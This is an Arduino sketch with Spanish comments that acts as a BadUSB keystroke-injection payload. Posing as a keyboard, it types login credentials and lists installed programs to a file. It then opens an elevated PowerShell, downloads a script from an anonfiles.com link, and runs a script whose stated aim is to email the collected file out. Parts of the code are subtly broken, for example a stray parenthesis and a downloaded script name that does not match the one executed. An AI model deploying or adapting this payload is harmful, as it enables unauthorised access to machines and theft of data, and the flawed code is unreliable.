#include <HIDKeyboard.h> // Aqui se incluye la libreria
HIDKeyboard keyboard;// Defininiedo en una variable la libreria

uint8_t buf[8] = { 0 }; //Búfer de informes de teclado

#define KEY_LEFT_GUI 0x08 // Tecla windows + r
#define KEY_R 21 // Tecla R
#define KEY_ENTER 40 // Tecla ENTER
/*
Teclas extras

#define KEY_LEFT_CTRL   0x80
#define KEY_LEFT_SHIFT    0x81
#define KEY_LEFT_ALT    0x82
#define KEY_LEFT_GUI    0x83
#define KEY_RIGHT_CTRL    0x84
#define KEY_RIGHT_SHIFT   0x85
#define KEY_RIGHT_ALT   0x86
#define KEY_RIGHT_GUI   0x87
*/
void setup()
{
Serial.begin(9600);
delay(200);
}

void loop()
{
buf[0] = KEY_ENTER; //Bufer tecla enter

Serial.write(buf, 8); // Send GUI+R keypress

buf[0] = KEY_LEFT_GUI; ////Bufer tecla Windows + R
buf[2] = KEY_R; ////Bufer tecla R
buf[4] = 0;

//LINEAS DE CODIGO PARA EL INICIO DE SESION AUTOMATICO
keyboard.println("abanico01"); // Ingresa por teclado el texto "abanico01"
delay(2000); // Espera de 2 segundos
keyboard.println(KEY_ENTER); //Se presiona la tecla ENTER
delay(2000);
keyboard.println("123456"); // Ingresa por teclado el texto ""
delay(2000);
keyboard.println(KEY_ENTER);
delay(2000);
keyboard.println("");// Contraseña correcta por defecto
delay(2000);
keyboard.println(KEY_ENTER); //Se presiona la tecla ENTER
delay(2000);

//CODIGO PARA CREAR UN ARCHIVO DONDE ESTE LA LISTA DE PROGRAMAS
Serial.write(buf, 8); // Ejecucion de las tecla windows + r 
delay(200);
keyboard.println("cmd"); // Ingresa por teclado cmd
delay(1000);
keyboard.println("cd %programfiles%"); // Ingreso a la carpeta de archivo de programas
delay(1000);
keyboard.println("dir > %userprofile%/programas.txt"); // creacion de archivo de lista de programas en la carpeta user
delay(1000);
keyboard.println("exit"); // para salir del cmd
delay(1000);

//CODIGO PARA DESCARGAR Y EJECUTAR EL ARCHIVO
Serial.write(buf, 8); // Ejecucion de las tecla windows + r 
delay(300);
keyboard.println("powershell");
delay(2000);
keyboard.println("start-process PowerShell -verb runas"); // Ingresar modo administrador
delay(2000);
keyboard.println("(New-Object System.Net.WebClient).DownloadFile(\"https://anonfiles.com/Xev0K6p3v7/programas1_ps1\",\"$env:USERPROFILE\\programas.ps1\")")); //Descarga y crea el script programas1
delay(2000);
keyboard.println("exit"); // Sale de la venta porwershell
delay(1000);

//CODIGO PARA HACER CORRER EL SCRIPT Y POSTERIOR ENVIO DE CORREO DEL .text
Serial.write(buf, 8); // Ejecucion de las tecla windows + r 
delay(300);
keyboard.println("powershell"); //Ingresa como texto powershell
delay(1000);
keyboard.println("cd C:/"); // Ingreso a la carpeta C
delay(3000);
keyboard.println("./chrome1.ps1"); // EJECUCION DEL SCRIPT
delay(1000);
keyboard.println("exit"); //Cierre de la ventana 
delay(1000);

while(1); // Linea de codigo para que el ducky script se ejecute una sola vez cada que se inserte

}
